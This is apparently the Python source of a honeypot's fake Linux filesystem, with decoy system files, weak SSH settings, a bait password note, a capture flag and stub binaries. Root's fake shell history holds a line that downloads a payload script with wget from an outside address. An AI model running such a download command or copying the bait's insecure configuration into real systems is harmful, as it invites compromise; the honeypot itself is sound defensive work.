class FakeFilesystem:
    def __init__(self) -> None:
        self._tree = {
            "etc": {
                "passwd": (
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
                    "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
                    "sync:x:4:65534:sync:/bin:/bin/sync\n"
                    "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n"
                    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n"
                    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n"
                    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n"
                    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n"
                    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n"
                    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n"
                    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n"
                    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n"
                    "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n"
                    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
                    "systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n"
                    "systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n"
                    "messagebus:x:102:104::/nonexistent:/usr/sbin/nologin\n"
                    "sshd:x:103:65534::/run/sshd:/usr/sbin/nologin\n"
                    "antony:x:1000:1000:Antony,,,:/home/antony:/bin/bash\n"
                ),
                "shadow": (
                    "root:*:19840:0:99999:7:::\n"
                    "daemon:*:19840:0:99999:7:::\n"
                    "bin:*:19840:0:99999:7:::\n"
                    "sys:*:19840:0:99999:7:::\n"
                    "sshd:*:19840:0:99999:7:::\n"
                    "antony:!:19840:0:99999:7:::\n"
                ),
                "group": (
                    "root:x:0:\n"
                    "daemon:x:1:\n"
                    "bin:x:2:\n"
                    "sys:x:3:\n"
                    "adm:x:4:antony\n"
                    "sudo:x:27:antony\n"
                    "antony:x:1000:\n"
                ),
                "hostname": "honeypot\n",
                "hosts": "127.0.0.1 localhost\n127.0.1.1 honeypot\n",
                "os-release": (
                    'PRETTY_NAME="Ubuntu 22.04.3 LTS"\n'
                    'NAME="Ubuntu"\n'
                    'VERSION_ID="22.04"\n'
                    'VERSION="22.04.3 LTS (Jammy Jellyfish)"\n'
                    "VERSION_CODENAME=jammy\n"
                    "ID=ubuntu\n"
                    "ID_LIKE=debian\n"
                ),
                "ssh": {
                    "sshd_config": (
                        "#Port 22\n"
                        "PermitRootLogin yes\n"
                        "PasswordAuthentication yes\n"
                        "PubkeyAuthentication yes\n"
                        "UsePAM yes\n"
                    ),
                },
                "crontab": (
                    "# /etc/crontab: system-wide crontab\n"
                    "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n"
                    "25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n"
                ),
            },
            "var": {
                "www": {"html": {"index.html": "<html><body>It works!</body></html>"}},
                "log": {
                    "auth.log": (
                        "Sep  8 10:42:13 honeypot sshd[1234]: Accepted password for root from 192.168.1.100 port 51234 ssh2\n"
                        "Sep  8 10:47:55 honeypot sshd[1402]: Failed password for invalid user admin from 10.0.0.7 port 44112 ssh2\n"
                    ),
                    "syslog": (
                        "Sep  8 10:42:11 honeypot systemd[1]: Started SSH Socket.\n"
                        "Sep  8 10:42:13 honeypot systemd[1]: Started OpenSSH Server Daemon.\n"
                    ),
                    "dmesg": (
                        "Linux version 5.15.0-105-generic (buildd@lcy02-amd64-106) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0)\n"
                    ),
                },
            },
            "home": {
                "admin": {
                    "notes.txt": "password123\n",
                    ".bashrc": "# ~/.bashrc: executed by bash(1) for non-login shells.\n",
                },
                "user": {
                    ".bashrc": "# ~/.bashrc: executed by bash(1) for non-login shells.\n",
                },
                "antony": {
                    ".bash_history": "ls -la\ncd /var/www\ncat /etc/passwd\n",
                    ".bashrc": "# ~/.bashrc: executed by bash(1) for non-login shells.\n",
                    ".ssh": {
                        "authorized_keys": (
                            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3FakeHoneypotKeyOnly antony@kali\n"
                        ),
                    },
                },
            },
            "tmp": {
                ".X11-unix": {},
                "systemd-private-8d3f1a2b-nginx.service-abc": {},
                "temp_install.log": "2026-09-08 10:42:13 installer started\n",
            },
            "bin": {
                "bash": "fake bash stub\n",
                "cat": "fake cat stub\n",
                "ls": "fake ls stub\n",
                "less": "fake less stub\n",
                "vi": "fake vi stub\n",
                "vim": "fake vim stub\n",
                "grep": "fake grep stub\n",
                "egrep": "fake egrep stub\n",
                "fgrep": "fake fgrep stub\n",
                "awk": "fake awk stub\n",
                "sed": "fake sed stub\n",
                "head": "fake head stub\n",
                "tail": "fake tail stub\n",
                "sort": "fake sort stub\n",
                "uniq": "fake uniq stub\n",
                "wc": "fake wc stub\n",
                "cut": "fake cut stub\n",
                "find": "fake find stub\n",
                "file": "fake file stub\n",
                "touch": "fake touch stub\n",
                "mkdir": "fake mkdir stub\n",
                "rm": "fake rm stub\n",
                "tee": "fake tee stub\n",
                "dd": "fake dd stub\n",
                "chmod": "fake chmod stub\n",
                "chown": "fake chown stub\n",
                "ln": "fake ln stub\n",
                "rmdir": "fake rmdir stub\n",
                "which": "fake which stub\n",
                "stat": "fake stat stub\n",
                "strings": "fake strings stub\n",
                "base64": "fake base64 stub\n",
                "openssl": "fake openssl stub\n",
                "nc": "fake nc stub\n",
                "ncat": "fake ncat stub\n",
                "ping": "fake ping stub\n",
                "wget": "fake wget stub\n",
                "curl": "fake curl stub\n",
                "ssh": "fake ssh stub\n",
                "scp": "fake scp stub\n",
                "sftp": "fake sftp stub\n",
                "kubectl": "fake kubectl stub\n",
                "ddrescue": "fake ddrescue stub\n",
                "rsync": "fake rsync stub\n",
                "rsyncd": "fake rsyncd stub\n",
                "bash-completion": "fake bash-completion stub\n",
                "sshd": "fake sshd stub\n",
                "systemd-sysusers": "fake systemd-sysusers stub\n",
                "tmpfiles.d": "fake tmpfiles.d stub\n",
            },
            "sbin": {
                "systemctl": "fake systemctl stub\n",
                "service": "fake service stub\n",
                "journalctl": "fake journalctl stub\n",
                "coredumpctl": "fake coredumpctl stub\n",
                "ip": "fake ip stub\n",
                "route": "fake route stub\n",
                "ss": "fake ss stub\n",
                "netstat": "fake netstat stub\n",
                "lsof": "fake lsof stub\n",
                "ifconfig": "fake ifconfig stub\n",
                "arp": "fake arp stub\n",
                "find": "fake find stub\n",
                "file": "fake file stub\n",
                "stat": "fake stat stub\n",
                "mount": "fake mount stub\n",
                "chmod": "fake chmod stub\n",
                "chown": "fake chown stub\n",
                "ln": "fake ln stub\n",
                "rmdir": "fake rmdir stub\n",
                "which": "fake which stub\n",
                "stat2": "fake stat stub\n",
                "strings": "fake strings stub\n",
                "base64": "fake base64 stub\n",
                "openssl": "fake openssl stub\n",
                "nc": "fake nc stub\n",
                "ncat": "fake ncat stub\n",
                "ping": "fake ping stub\n",
                "wget": "fake wget stub\n",
                "curl": "fake curl stub\n",
                "ssh": "fake ssh stub\n",
                "scp": "fake scp stub\n",
                "sftp": "fake sftp stub\n",
                "kubectl": "fake kubectl stub\n",
                "ddrescue": "fake ddrescue stub\n",
                "rsync": "fake rsync stub\n",
                "rsyncd": "fake rsyncd stub\n",
                "bash-completion": "fake bash-completion stub\n",
            },
            "lib": {},
            "lib64": {},
            "usr": {"bin": {}, "lib": {}, "local": {}},
            "boot": {},
            "dev": {},
            "opt": {},
            "srv": {},
            "mnt": {},
            "media": {},
            "run": {"sshd": {}},
            "proc": {
                "version": (
                    "Linux version 5.15.0-105-generic (buildd@lcy02-amd64-106) "
                    "(gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) "
                    "#115-Ubuntu SMP Mon Apr 15 09:52:04 UTC 2024\n"
                ),
            },
            "sys": {},
            "root": {
                "flag.txt": "flag{you_got_pwned}\n",
                "README": "Do not delete this file.\n",
                ".bashrc": (
                    "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
                    "# If not running interactively, don't do anything\n"
                    "case $- in\n"
                    "    *i*) ;;\n"
                    "      *) return;;\n"
                    "esac\n"
                ),
                ".profile": "# ~/.profile: executed by the command interpreter for login shells.\n",
                ".bash_history": (
                    "ls -la\n"
                    "cd /tmp\n"
                    "wget http://192.168.1.100/payload.sh\n"
                    "history\n"
                ),
                ".ssh": {
                    "authorized_keys": (
                        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeHoneypotKeyOnly root@honeypot\n"
                    ),
                },
            },
        }

    def _resolve(self, path: str):
        parts = [part for part in path.split("/") if part != ""]
        node = self._tree
        for part in parts:
            if isinstance(node, dict) and part in node:
                node = node[part]
            else:
                return None
        return node

    def exists(self, path: str) -> bool:
        return self._resolve(path) is not None

    def is_dir(self, path: str) -> bool:
        return isinstance(self._resolve(path), dict)

    def is_file(self, path: str) -> bool:
        node = self._resolve(path)
        return node is not None and not isinstance(node, dict)

    def ls(self, path: str) -> list:
        node = self._resolve(path)
        if isinstance(node, dict):
            return sorted(node.keys())
        return []

    def cat(self, path: str) -> str:
        node = self._resolve(path)
        if node is None:
            return f"cat: {path}: No such file or directory"
        if isinstance(node, dict):
            return f"cat: {path}: Is a directory"
        return node

    def file(self, path: str) -> str:
        node = self._resolve(path)
        if node is None:
            return f"{path}: cannot open ({path}: No such file or directory)\n"
        if isinstance(node, dict):
            return f"{path}: directory\n"
        return f"{path}: ASCII text\n"
